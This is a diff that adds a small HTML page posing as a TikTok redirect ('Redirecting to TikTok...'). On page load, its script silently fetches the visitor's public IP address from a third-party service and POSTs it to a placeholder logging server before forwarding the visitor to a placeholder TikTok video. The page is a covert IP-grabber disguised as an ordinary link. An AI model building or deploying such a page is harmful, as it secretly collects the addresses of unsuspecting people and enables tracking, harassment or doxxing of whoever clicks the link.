@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Replace with the actual TikTok link
+        const targetUrl = 'https://www.tiktok.com/@yourusername/video/yourvideoid';
+
+        // Get the IP address using a third-party service
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('IP Address:', data.ip);
+                // Log the IP address to a server or database
+                fetch('https://yourserver.com/logip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ ip: data.ip })
+                });
+                // Redirect to the target URL
+                window.location.href = targetUrl;
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+                window.location.href = targetUrl;
+            });
+    </script>
+</head>
+<body>
+    <p>Redirecting to TikTok...</p>
+</body>
+</html>
